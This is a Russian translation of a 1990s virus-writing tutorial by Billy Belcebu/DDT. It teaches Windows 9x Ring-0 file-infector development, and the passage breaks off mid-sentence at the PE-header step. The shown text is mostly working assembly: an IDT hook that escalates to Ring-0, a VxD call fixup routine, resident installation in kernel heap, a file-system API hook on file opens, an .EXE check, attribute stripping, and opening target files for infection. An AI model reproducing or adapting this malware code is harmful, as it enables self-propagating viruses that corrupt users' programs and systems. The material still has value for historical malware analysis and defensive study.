          
 █│█│█▀█│█▄▄ ▀┘▀█▀┘█▀█│▀█▀┘  █│█│ Туториал про вирусы под Ring-0
 █▀█│█▀█│█▄█│█│ █│ █▀█│ █│   ▀▀█│ Billy Belcebu/DDT         перевод: NeKr0!
─────────────────────────────────

 ┌────────────────────────┐
 │ Simple Ring-0 tutorial │                                 Billy Belcebг/DDT
 └────────────────────────┘

 Ну, это часть другого текста, который я сейчас пишу. Эта часть моего будущего
 Virus Writing Guide For Win32 рассказывает о нулевом кольце. Как можно увидеть
 это типа моего DOS Virus Writing Guide: огромного :) Приготовтесь иметь еще
 один туториал на вашем ПК. Т.к он еще не закончен и я вижу недостаток тутори-
 алов о Ring-0 в современных журналах (типа пиплы которые умеют кодить в Ring-0 
 слишком ленивы чтоб объяснить это) я спер этот текст из моего руководства и
 и представляю его здесь :) Ну, теперь он у вас. Наслаждайтесь! ;)

 %   Введение   %
 ────────────────

 Свобода! Вы любите свободу? В Ring-0 мы вне законов, ничего не запрещено здесь
 Из-за некомпетентности Micro$oft мы имеем несколько путей перейти на уровень
 куда мы теоритически не можем перейти. Но, по крайней мере мы можем перейти под
 Win9X системами (и в NT, как я слышал) :)
 Вот например идиоты из Micro$oft взяли и сняли защиту с таблицы прерываний. Это
 на мой взгляд огромная дыра в безопасности. Но к чему я это все, если мы можем
 накодить вирус используя эту дыру и это круто! ;)

 % Доступ в Ring-0 %
 ───────────────────

 Ну, я объясню вам простейший метод на мой взгляд - модификацию IDT. Адрес IDT 
 (Interrupt Descriptor Table) не фиксирован в памяти и мы должны использовать
 команду чтоб узнать адрес, эта команда SIDT. 

 -·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·
 SIDT - Сохранить Interrupt Descriptor Table (286+ privileged)
        Usage:  SIDT    dest
        Modifies flags: none
        Сохраняет регистр Interrupt Descriptor Table (IDT) в указанное место
                                 Clocks                 Размер
        Operands         808X  286   386   486          Байт
        mem64              -    12    9     10            5

        0F 01 /1 SIDT m Store IDTR to m
 -·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·

 Если после этого вы еще не въехали что мы делаем с SIDT - то комманда просто
 кладет смещение FWORD (формат WORD:DWORD) того места, где лежит  IDT. И если
 мы  знаем,  где  лежит IDT, мы можем изменить вектор прерывания так, чтоб он
 указывал на наш код. Вот она тупость Micro$oft'овских программистов. Продолжим
 нашу работу. После установки вектора на наш код (и сохранения его для дальней-
 шего воостановления) мы должны только вызвать прерывание, которое мы перехва-
 тили. Если для вас все это выглядит непонятно - здесь есть кусок кода, который
 переходит в Ring-0 посредством модификации IDT.

;───[ CUT HERE ]─────────────────────────────────────────────────────────────

        .586p                           ; Вaх... просто для прикола.
        .model  flat                    ; Хeхeхe люблю 32bit'ные штучки ;)

extrn   ExitProcess:PROC
extrn   MessageBoxA:PROC

Interrupt        equ     01h            ; Ничего особого

        .data

 szTitle         db      "Ring-0 example",0                 
 szMessage       db      "I'm alive and kicking ass",0

 ;-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·;
 ; Ну, теперь вам тут все понятно, не так-ли? :)                            ;
 ;-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·;

        .code

 start:
        push    edx
        sidt    [esp-2]                 ; Таблицу прерываний - в стек
        pop     edx
        add     edx,(Interrupt*8)+4     ; Получим вектор прерывания

 ;-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·;
 ; Это очень просто. SIDT, как я объяснял ранее, кладет адрес IDT в указан- ;
 ; ную область памяти, и для удобства мы используем стек напрямую. Получаем ;
 ; адрес командой POP, которая идет следом, POP кладет в регистр (в данном  ;
 ; случае EDX) смещение IDT. Следующей командой мы узнаем смещение нужного  ;
 ; нам прерывания. Это просто, как таблица векторов прерываний в DOS'е...   ;
 ;-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·;

        mov     ebx,[edx]
        mov     bx,word ptr [edx-4]     ; Whoot Whoot

 ;-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·;
 ; Очень легко. Просто сохраним содержимое EDX в EBX чтоб использовать потом;
 ;-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·;

        lea     edi,InterruptHandler

        mov     [edx-4],di
        ror     edi,16                  ; Засунем MSW в LSW
        mov     [edx+2],di

 ;-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·;
 ; Я уже говорил как тут все просто? :) Здесь мы получили в EDI смещение    ;
 ; нового обработчика прерывания, и тремя командами ниже занесли его в IDT. ;
 ; Но зачем этот ROR? Ну, без разницы что вы используете ROR, SHR или SAR,  ;
 ; потому что это используется для пересылки MSW (Старшего слова) смещения  ;
 ; нового обработчика прерывания в LSW (Младшее слово), и его сохранения    ;
 ;-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·;

        push    ds                      ; Осторожно осторожно осторожно...
        push    es

        int     Interrupt               ; Ring-0 идет сюдааааааа!!!!!!!

        pop     es
        pop     ds

 ;-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·;
 ; Mммм... интересно. Я сохранил DS и ES для безопасности и предупреждения  ;
 ; всяких глюков, но все работает и без этого, поверьте мне. Т.к. таблица   ;
 ; прерываний уже пропатчена - остается только вызвать прерывание...        ;
 ; И ТЕПЕРЬ МЫ В RING-0! Программа продолжается с метки InterruptHandler.   ;
 ;-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·;
 
        mov     [edx-4],bx              ; Восстановим старое значение прерывания
        ror     ebx,16                  ; ROR, SHR, SAR... кто знает?
        mov     [edx+2],bx

 back2host:
        push    00000000h               ; Стиль MessageBox
        push    offset szTitle          ; Заголовок MessageBox
        push    offset szMessage        ; Сообщение
        push    00000000h               ; Хэндл владельца

        call    MessageBoxA             ; Вызов API

        push    00000000h
        call    ExitProcess
        ret

 ;-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·;
 ; И так, больше делать нечего, кроме восстановки старого значения векторов,;
 ; которое мы сохранили в EBX. Круто, не правда-ли? :) А дальше, мы возвра- ;
 ; щаемся назад. (Как и задумано сначала) ;)                                ;
 ;-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·;

 InterruptHandler:                       
        pushad

        ; Здесь мог бы разместиться ваш код :)

        popad
        iretd                           

 end start

;───[ CUT HERE ]─────────────────────────────────────────────────────────────

 [* Я знаю, существует много путей доступа в Ring-0, но эта часть моего Virus
 Writing Guide  for Win32 будет иметь их все (по крайней мере известные на 
 сегодняшний день: метод IDT (выше), вставка VMM и создание Call Gate'ов)  *]

 Хорошо, теперь мы можем получить доступ. Я думаю каждый может сделать это,но
 сразу возникает вопрос возникающий у нормального VX кодера, когда он получает
 доступ в Ring-0 первый раз: Что мне теперь делать?. 

 % Создание вирусов в Ring-0 %
 ─────────────────────────────

 Ну, я люблю начинать уроки с маленького алгоритма, итак перед вами то, что мы
 должны делать, когда мы пишем вирус под Ring-0.

 -·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·
 1. Узнать запущенную OS: если NT - пропустить вирус и вернуть управление проге.
 2. Перейти в Ring-0 (IDT, вставка VMM или создание Call Gate)
 3. Вызвать прерывание, которое содержит наш код.
    3.1. Найти место куда писать резидентную часть (Выделить память или в стеке)
    3.2. Закинуть туда вирус
    3.3. Перехватить File System и сохранить старое значение
         3.3.1. В перехватчике FS, сначала сохранить все параметры, исправитьESP.
         3.3.2. Параметры в стек
         3.3.3. Проверить хочет ли система открыть файл, если нет - пропустить.
         3.3.4. Если открывает, сначала перевести имя файла в asciiz.
         3.3.5. Затем проверить его на EXE'шность. Если нет - пропустить.
         3.3.6. Открыть, прочитать заголовок, сделать что надо, записать назад,
		дописать себя и закрыть
         3.3.7. Вызвать старый перехватчик
         3.3.8. Пропустить все возвращаемые параметры в ESP
         3.3.9. Возврат
    3.4. Возврат
 4. Восстановить старые вектора прерываний
 5. Передать управление проге
 -·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·

 Алгоритм немного большой, все равно я старался дать основные вещи, но я пред-
 почитаю действовать напрямую. Ok, c'mon. Let's go.

 Протестировать OS при запуске 
  ────────────────────────────┘ 

 Так как есть некоторые проблемы с Ring-0 под NT (Super, разберись с этим!) мы
 должны проверить OS в которой мы очутились и передать управление проге если это
 не Win9X система. Ну, вот вам несколько способов сделать это:

 - Использовать SEH
 - Проверить значение регистра DS, например.

 Я предполагаю вы знаете как использовать SEH, неправда ли? Я объяснял его 
 использование в другой статье, время пойти и прочитать ее :) Что касается вто-
 рого способа, вот вам код:

        mov     ax,ds 
        cmp     ax,137h
        jb      back2host
 
 Это предполагает что DS>137 в Win9X системах. Как вы уже были предупреждены,
 этот последний способ работает, но SEH не только для этого. И так SEH занимает
 больше байт и выполняет больше функций, а этот последний способ более оптимизи-
 рован. Просто выбирайте что хотите.

 Переход в 0 выполнение прерывания
  ────────────────────────────────┘ 

 Простейший метоб объяснене в части Доступ в Ring-0 этого документа и я больше 
 не желаю говорить здесь об этом :)

 Теперь мы в Ring-0... что делать?
  ────────────────────────────────┘ 

 Ну, в Ring-0 вместо API мы имеем VxD-сервисы. Доступ к VxD сервисам осуществля-
 ется так:

        int     20h
        dd      vxd_service

 Этот vxd_service занимает 2 слова, MSW указывает номер VxD, LSW указывет функ-
 цию, которую мы вызываем из этого VxD. Для примера я использую значение
 VMM_PageModifyPermissions:

        dd      0001000Dh
                └┴┴┤└┴┴┴── Service  000Dh _PageModifyPermissions
                   └────── VxD      0001h VMM

 И так для вызова мы должны сделать чтото типа этого:

        int     20h
        dd      0001000Dh

 Отлично, очень хороший способ программирования - делать макросы, которые делают
 это сами и задать все числа через EQU. Но это как вы захотите. Эти значения
 фиксированны, как в Win95 так и в Win98. Не беспокойтесь об этом, один из плю-
 сов Ring-0 - то что вам ненадо искать никаких смещений в kernel'е или еще где
 (как мы это делали с API), потому что это ненадо, это должно быть так :)

 Здесь я должен сказать ОЧЕНЬ важную вещь, которую мы должны помнить, когда де-
 лаем вирус под Ring-0: int 20h и адрес, который я показывал в Доступе к VxD 
 функциям, выглядит в памяти как:

        call    dword ptr [VxD_Service] ; Вызов функции

 Ну, вы должно быть подумали, что это что-то простое, очень важно и реально
 трудно, потому что вирус копируется в прогу с этими CALL'ами вместо int'а и
 dword'а функции, из-за этого вирус сможет работать только на вашем компьютере,
 но не на других :( Ну, как и в реальной жизни, эта проблема имеет множество ре-
 шений. Одно из них, как делала Win95.Padania, создание процедуры для пофиксенья
 после каждого вызова VxD. Другие способы: сделать таблицу со всеми смещениями 
 для пофиксенья, делать это напрямую и т.д. Вот вам мой код, вы можете увидеть
 его применение в моем вирусе Garaipena:

 VxDFix:
        mov     ecx,VxDTbSz             ; Количество фиксов
        lea     esi,[ebp+VxDTblz]       ; Указатель на таблицу
 @lo0pz:lodsd                           ; В EAX - смещение из таблицы
        mov     word ptr [ebp+eax],20CDh ; Записать по этому адресу
        mov     edx,dword ptr [ebp+eax+08h] ; Получить значение VxD функции
        mov     dword ptr [ebp+eax+02h],edx ; И восстановить его 
        loop    @lo0pz                  ; Перейти к другому смещению
        ret

 VxDTblz        label   byte            ; Таблица смещений для VxD вызовов
        dd      (offset @@1)            
        dd      (offset @@2)
        dd      (offset @@3)
        dd      (offset @@4)
        ; [...] все остальные VxD вызовы должны быть описаны здесь :)

 VxDTbSz        equ     (($-offset VxDTblz)/4) ; Их количество

 Я надеюсь вы поняли, что для каждого VxD вызова мы должны иметь его смещение 
 здесь. О блин, я почти забыл другую важную вещь: как должен выглядеть ваш 
 VxDCall макрос если вы используете мою процедуру VxDFix. Вот так:

 VxDCall macro  VxDService              
        local   @@@@@@
        int     20h                     ; CD 20                 +00h
        dd      VxDService              ; XX XX XX XX           +02h
        jmp     @@@@@@                  ; EB 04                 +06h
        dd      VxDService              ; XX XX XX XX           +08h
 @@@@@@:
        endm

 Ok. Теперь нам нужно место, куда мы пойдем резидентом.Лично я предпочитаю место
 в куче (heap), пому что это очень просо кодить (ленивость rules!).

 -·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·
 **     IFSMgr_GetHeap - Выделить память в куче (heap)
 
        Эта служба недоступна пока IFSMgr выполняет SysCriticalInit.
 
 
  Вход  Стек - Запрашиваемый размер
  Выход EAX  - адрес выделенной памят.  0 если ошибка
  Использует C регистры  (eax, ecx, edx, флаги)
 -·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·

 Это была инфа из Win95 DDK. Давайте взглянем на пример этого:

 InterruptHandler:
        pushad                          ; Все регистры в стек

        push    virus_size+1024         ; Размер памяти, который нам нужен
					; (размер вируса+буффер)
                                        ; Так как вы можете использовать буфферы
                                        ; лучше добавить немного байт для них
 @@1:   VxDCall IFSMgr_GetHeap
        pop     ecx

 Теперь понятно? Ну, как сказано в DDK, должен быть 0 в EAX если ошибка, давайте
 проверим на предмет ошибок. POP который идет после ОЧЕНЬ важен, потому что 
 большинство функций VxD не корректируют стек, число, которое мы загнали в стек
 перед вызовом функции VxD все еще в стеке.

        or      eax,eax                 ; cmp eax,0
        jz      back2ring3

 Если функция успешна, мы имеем в EAX адрес куда мы должны загнать тело вируса,
 итак поехали. 

        mov     byte ptr [ebp+semaphore],0 ; во время заражения будет 1

        mov     edi,eax                 ; Куда загнать вирус
        lea     esi,ebp+start           ; Откуда его взять
        push    eax                     ; Сохраним адрес памяти на будущее
        sub     ecx,1024                ; Мы загоним тока вирус
        rep     movsb                   ; Записываем его в TSR ;)
        pop     edi                     ; Восстановим адрес памяти

 Ну, мы имеем вирус в памяти, готовый быть TSR, правильно? И мы имеем в EDI 
 адрес его начала в этой памяти, мы можем использовать его как дельту для следу-
 ющей функции :) Ok, теперь нам надо перехватить API файловой системы, правильно? 
 Ok, вот функция которая делает это. Сюрприз, правда? Программисты Micro$oft 
 сделали гразную работу за нас. 

 -·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·
 **     IFSMgr_InstallFileSystemApiHook - установить перехват API файловой 
					  системы
 
        Эта функция устанавливает перехватчик api файлолвой системы. Этот перех-
        ватчик между менеджером IFS и FSD. Итак, на перехватчик приходят любые
        вызовы, которые менеджер IFS посылает в FSDs.
 
        Эта процедура использует последовательность вызова C6 386 _cdecl 
 
        ppIFSFileHookFunc
                IFSMgr_InstallFileSystemApiHook( pIFSFileHookFunc HookFunc )
 
  Вход  Стек - адрес функции, которая будет перехватчиком
  Выход EAX  - Указатель на переменную содержащую адрес предыдущего перехватчика
               в цепочке перехватчиков.
  Использует C регистры
 -·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·

 Понятно? Если нет, я надеюсь вы поймете это сморя в код. Ok, перехватим файло-
 вую систему...

        lea     ecx,[edi+New_Handler]   ; (адрес вируса в памяти + адрес перех-
					; ватчика)
        push    ecx                     ; В стек 

 @@2:   VxDCall IFSMgr_InstallFileSystemApiHook ; Вызовем функцию

        pop     ecx                     ; Не забывайте об этом, парни
        mov     dword ptr [edi+Old_Handler],eax ; EAX=предыдущий перехватчик

 back2ring3:
        popad
        iretd                           ; обратно в Ring-3. 

 Тут мы увидели "инсталляционную" часть вируса в Ring-0. Теперь мы должны сде-
 лать собственно сам перехватчик файловой системы :) Это просто, или нет, как
 вы думаете? :)

 Перехватчик файловой системы: большой прикол !!!
  ───────────────────────────────────────────────┘

 Эх, перед тем, как перейти собственно к инфицированию, надо сделать еще нес-
 колько вещей. Первая из них - мы должны сделать копию указателя на стек, сохра-
 нить содержание ESP в регистре EBP. После этого, мы должны вычесть 20h байт из
 ESP, чтобы пофиксить указатель на стек. Давайте взглянем на пример:

 New_Handler equ  $-(offset virus_start)
 FSA_Hook:
        push    ebp                     ; Сохраним содержимое EBP на будущее
        mov     ebp,esp                 ; Сохраним содержимое ESP в EBP
        sub     esp,20h                 ; И пофиксим стек

 Теперь, т.к. наша функция вызвана системой со всякими параметрами, мы должны
 запушить их, как это делает реальный перехватчик. Параметры для запушивания на-
 чинаются с EBP+08h и до EBP+1Ch включительно. 

        push    dword ptr [ebp+1Ch]     ; Push'em all!!!!!!!! :)
        push    dword ptr [ebp+18h]
        push    dword ptr [ebp+14h]
        push    dword ptr [ebp+10h]
        push    dword ptr [ebp+0Ch]
        push    dword ptr [ebp+08h]

 Теперь мы имеем запушенные параметры о которых можем больше не беспокоится.
 После этого мы должны проверить функцию IFSFN, которую хотим перехватывать.
 Перед вами маленький список наиболее важных:
 (прим. переводчика: надеюсь это переводить не надо :)
 -·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·
 ** IFS Function IDs passed to IFSMgr_CallProvider

 IFSFN_READ         equ         00h     ; Прочитать из файла
 IFSFN_WRITE        equ         01h     ; Записатьв файл
 IFSFN_FINDNEXT     equ         02h     ; Найти следующий файл (формат LFN) 
 IFSFN_FCNNEXT      equ         03h     ; Изменить поиск
 IFSFN_SEEK         equ         0Ah     ; Позицирование в файле
 IFSFN_CLOSE        equ         0Bh     ; Закрыть хендл
 IFSFN_COMMIT       equ         0Ch     ; commit buffered data for handle
 IFSFN_FILELOCKS    equ         0Dh     ; lock/unlock byte range
 IFSFN_FILETIMES    equ         0Eh     ; Получить/установить время изм. файла
 IFSFN_PIPEREQUEST  equ         0Fh     ; named pipe operations
 IFSFN_HANDLEINFO   equ         10h     ; get/set file information
 IFSFN_ENUMHANDLE   equ         11h     ; enum file handle information
 IFSFN_FINDCLOSE    equ         12h     ; find close для длинных имен файлов
 IFSFN_FCNCLOSE     equ         13h     ; Find Change Notify Close
 IFSFN_CONNECT      equ         1Eh     ; connect or mount a resource
 IFSFN_DELETE       equ         1Fh     ; Удалить файл
 IFSFN_DIR          equ         20h     ; Операции с директориями
 IFSFN_FILEATTRIB   equ         21h     ; Операции с DOS атрибутами
 IFSFN_FLUSH        equ         22h     ; flush volume
 IFSFN_GETDISKINFO  equ         23h     ; query volume free space
 IFSFN_OPEN         equ         24h     ; Открыть файл
 IFSFN_RENAME       equ         25h     ; rename path
 IFSFN_SEARCH       equ         26h     ; search for names
 IFSFN_QUERY        equ         27h     ; query  resource info (network only)
 IFSFN_DISCONNECT   equ         28h     ; disconnect from resource (net only)
 IFSFN_UNCPIPEREQ   equ         29h     ; UNC path based named pipe operation
 IFSFN_IOCTL16DRIVE equ         2Ah     ; drive based 16 bit IOCTL requests
 IFSFN_GETDISKPARMS equ         2Bh     ; get DPB
 IFSFN_FINDOPEN     equ         2Ch     ; open an LFN file search
 IFSFN_DASDIO       equ         2Dh     ; direct volume access
 -·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·

 На первый раз нам интересна только фкнкция 24h, которая есть открытие файла.
 Система вызывает эту функцию все время, и никаких проблем с ней не возникает.
 Код этого прост настолько, насколько вы себе это представляете :)

        cmp     dword ptr [ebp+0Ch],24h ; Проверить на открытие файла системой
        jnz     back2oldhandler         ; Если нет, пропустить и назад.

 Теперь начинается веселье. Мы знаем что это система запрашивает открытие файла
 и настало наше время. Первым делом мы должны проверить - не мы ли это хотим 
 файл открыть... Это элементарно, просто добавьте маленькую переменную и она
 сделает эту работу без проблем. Кстати, все время забываю, получите дельту :) 

        pushad
        call    ring0_delta             ; Получим дельту
 ring0_delta:
        pop     ebx
        sub     ebx,offset ring0_delta

        cmp     byte ptr [ebx+semaphore],00h ; А не мы ли это пытаемся  
        jne     pushnback                    ; работать?

        inc     byte ptr [ebx+semaphore] ; Чтобы вызывать функции системы 
        pushad
        call    prepare_infection       ; Ну это мы увидим попозже
        call    infection_stuff
        popad
        dec     byte ptr [ebx+semaphore] ; Закончились наши функции :)

 pushnback:
        popad

 Сейчас я продолжу объяснять про хендл, а потом объясню что я делаю в процеду-
 рах prepare_infection и infection_stuff. Ну, мы просто выйдем из нашей проце-
 дуры если система пошлет вызов, ok? Теперь мы должны накодить процедуру, кото-
 рая будет вызывать старый перехватчик. Как вы помните (я надеюсь у вас нет 
 болезни Альцгеймера) мы поместили все параметры в стек, и так мы должны сде-
 лать только одну вещь - загрузить в регистр, неважно какой, старый адрес перех-
 ватчика и передать управление по этому адресу. После этого добавить 18h к ESP 
 (чтобы получить адрес возврата) и это все. Все это более понятно, если смотреть
 в код, и вот он:

 back2oldhandler:
        db      0B8h                    ; опкод комманды MOV EAX,imm32 
Old_Handler    equ  $-(offset virus_start)
        dd      00000000h               ; здесь будет старый адрес перехватчика.
        call    [eax]
        add     esp,18h                 ; фиксим стек (6x4)
        leave                           ; 6=кол-во парам-ров. 4=размер dword.
        ret                             ; возврат

 Подготовка к инфицированию 
  ─────────────────────────┘
 
 Давайте взгянем на детали кодинга под Ring-0. И так, когда мы были в нашем 
 перехватчике, мы видели вызовы двух процедур, правильно? Они не обязательны,
 но я сделал их для облегчения понимания кода, потому что я люблю когда все 
 вещи разложены по полочкам.

 Первая процедура, которая называется prepare_infection, была сделана по одной
 причине. Имя файла, которое система передает нам в параметре, имеет одну проб-
 лему. Система дает его нам в UNICODE, а это как есть бесполезно для нас. И так
 нам надо перевести его в ASCIIz, правильно? Ну, у нас есть VxD функция, которая
 делает эту работу за нас. Ее имя: UniToBCSPath. А вот ваш любимый исходный код.

 prepare_infection:
        pushad                          ; Все в стек
        lea     edi,[ebx+fname]         ; Куда поместить ASCII имя файла
        mov     eax,[ebp+10h]   
        cmp     al,0FFh
        jz      wegotdrive
        add     al,"@"                  ; Генерим имя диска
        stosb
        mov     al,":"                  ; Добавим ":"
        stosb
 wegotdrive:
        xor     eax,eax
        push    eax                     ; EAX = 0 -> Перевести в ASCII
        mov     eax,100h
        push    eax                     ; EAX = Размер строки для перевода
        mov     eax,[ebp+1Ch]
        mov     eax,[eax+0Ch]           ; EAX = Указатель на строку
        add     eax,4
        push    eax
        push    edi                     ; В стек - смещение имени файла

 @@3:   VxDCall UniToBCSPath

        add     esp,10h                 ; Пропустим возвращенные параметры
        add     edi,eax 
        xor     eax,eax                 ; Закончим строку нулем
        stosb
        popad                           ; А теперь достанем все из стека
        ret                             ; Возврат

 Собственно заражение 
  ───────────────────┘
 
 Здесь я вам раскажу как добиться модификации всех тех секций заголовка PE, ко-
 торые должны быть у зараженного файла. Но я не буду объяснять как управлять 
 ими, не потому что я ленив, просто потому что это статья про кодинг под Ring-0
 а не про инфицирование PE-файлов. Эта часть про прояцедуру infection_stuff из
 нашего перехватчика. Первым делом мы должны проверить файл в котором мы будем
 хозяйничать на предмет .EXE или другой неинтересной хрени. Сначала мы должны 
 найти 0 в имени файла, кторый говорит о том, что тут оно и кончается. Это очень
 просто закодить:

 infection_stuff:
        lea     edi,[ebx+fname]         ; Указатель на имя файла
 getend:
        cmp     byte ptr [edi],00h      ; Конец имени?
        jz      reached_end             ; Ага
        inc     edi                     ; Если нет, ищем следующий символ
        jmp     getend
 reached_end:

 Теперь мы имеем в EDI 0 от сторки ASCIIz, и как вы знаете, это обозначает конец
 строки, в данном случае - имени файла. Так, теперь главная проверка, смотрим
 это .EXE-файл? , и если нет - не заражаем. Ну, мы еще можем проверить на пред-
 мет .SCR (Windows-овый скринсавер), который как вы знаете, тоже  EXEшник... Ну
 это как вы захотите. А вот и пример:

        cmp     dword ptr [edi-4],"EXE." ; Проверим расширение на EXE
        jnz     notsofunny

 Как вы можете видеть, я сравниваю EDI-5. Объясняю это на простом примере ASCIIz
 строки:          
                   ┌───── DWORD который мы сравниваем : "EXE."
                 ┌┬┼┐
 "C:\WINDOWS\SHIT.EXE",0
                 ││││  └─ EDI
                 │││└──── EDI-1
                 ││└───── EDI-2
                 │└────── EDI-3
                 └─────── EDI-4

 Теперь мы знаем что этот файл - EXE файл :) И так, время убрать его атрибуты,
 открыть файл, изменить нужные поля, закрыть файл и восстановить атрибуты. Все
 эти функции доступны через другие IFS функции, через IFSMgr_Ring0_FileIO. Я не
 нашел документации о всех функциях, но это нам и не надо: для инфицирования
 достаточно и этих функций. Давайте взглянем на числа передаваемые через EAX для
 VxD функции IFSMgr_Ring0_FileIO:

 -·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·
 ; Многие функции контекстно-независимые, т.е. они не используют контекст теку-
 ; щей нити. Только одно исключение R0_LOCKFILE - всегда использует контекст
 ; текущей нити.

 R0_OPENCREATFILE        equ     0D500h  ; Open/Create a file
 R0_OPENCREAT_IN_CONTEXT equ     0D501h  ; Open/Create file in current contxt
 R0_READFILE             equ     0D600h  ; Read a file, no context
 R0_WRITEFILE            equ     0D601h  ; Write to a file, no context
 R0_READFILE_IN_CONTEXT  equ     0D602h  ; Read a file, in thread context
 R0_WRITEFILE_IN_CONTEXT equ     0D603h  ; Write to a file, in thread context
 R0_CLOSEFILE            equ     0D700h  ; Close a file
 R0_GETFILESIZE          equ     0D800h  ; Get size of a file
 R0_FINDFIRSTFILE        equ     04E00h  ; Do a LFN FindFirst operation
 R0_FINDNEXTFILE         equ     04F00h  ; Do a LFN FindNext operation
 R0_FINDCLOSEFILE        equ     0DC00h  ; Do a LFN FindClose operation
 R0_FILEATTRIBUTES       equ     04300h  ; Get/Set Attributes of a file
 R0_RENAMEFILE           equ     05600h  ; Rename a file
 R0_DELETEFILE           equ     04100h  ; Delete a file
 R0_LOCKFILE             equ     05C00h  ; Lock/Unlock a region in a file
 R0_GETDISKFREESPACE     equ     03600h  ; Get disk free space
 R0_READABSOLUTEDISK     equ     0DD00h  ; Absolute disk read
 R0_WRITEABSOLUTEDISK    equ     0DE00h  ; Absolute disk write
 -·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·

 Чарующие функции, не так ли? :) Если вглядеться, они напоминают функции DOS 
 прерывания 21h. Только они лучше :)

 И так, давайте сохраним старые атрибуты файла. Как вы можете видеть, эта ф-ция
 входит в список, который я дал вам ранее. Мы передаем параметр (4300h) в EAX 
 чтобы получить аттрибуты файла в  ECX. И так, после этого, заносим их в стек,
 а также имя файла, указатель в ESI.

        lea     esi,[ebx+fname]         ; Указатель на имя файла
        mov     eax,R0_FILEATTRIBUTES   ; EAX = 4300h
        push    eax                     ; Сохраним
        VxDCall IFSMgr_Ring0_FileIO     ; Получим аттрибуты
        pop     eax                     ; Восстановим 4300h из стека
        jc      notsofunny              ; Что-то пошло не так (?)

        push    esi                     ; Указатель на имя файла - в стек
        push    ecx                     ; Аттрибуты - в стек

 Теперь мы должны стереть их с лица земли. Без проблем. Функция установки атт-
 рибутов, как и перед этим в IFSMgr_Ring0_FileIO, только сейчас = 4301h. Как вы
 можете видеть - это просто как в DOS'е :)

        inc     eax                     ; 4300h+1=4301h :)
        xor     ecx,ecx                 ; Никаких аттрибутов сынок!
        VxDCall IFSMgr_Ring0_FileIO     ; Установим новые аттрибуты (удалим)
        jc      stillnotsofunny         ; Ошибка (?!)

 Мы имеем файл без аттрибутов, который ждет нас... что мы будем делать? Хех.
 Я думал вы умнее. Давайте откороем его! :) И так, как и все в этой части виру-
 са, мы должны вызвать IFSMgr_Ring0_FileIO, только теперь в EAX число для откры-
 тия файла, которое D500h. Параметры этой функции эквивалентны параметрам функ-
 ции 6C00h прерывания INT 21h (extended open):

 EAX = R0_OPENCREATFILE = D500h
 EBX = Флаги
 ECX = Аттрибуты создания
 EDX = Что делать если файл существует/не существует
 ESI = Указатель на имя файла

        lea     esi,[ebx+fname]         ; В ESI указатель на имя файла
        mov     eax,R0_OPENCREATFILE    ; EAX = D500h
        xor     ecx,ecx                 ; ECX = 0
        mov     edx,ecx
        inc     edx                     ; EDX = 1
        mov     ebx,edx
        inc     ebx                     ; EBX = 2
        VxDCall IFSMgr_Ring0_FileIO
        jc      stillnotsofunny         ; Черт.

        xchg    eax,ebx                 ; Соптимизировал немного, sucka! :)

 Теперь у нас в EBX хендл открытого файла, и будет прекрасно, если вы не будете
 использовать этот регистр для чего-нибудь, пока не закроете файл, okay? :)
 Теперь время прочитать PE-заголовок файла, сохранить его (и исправить), обно-
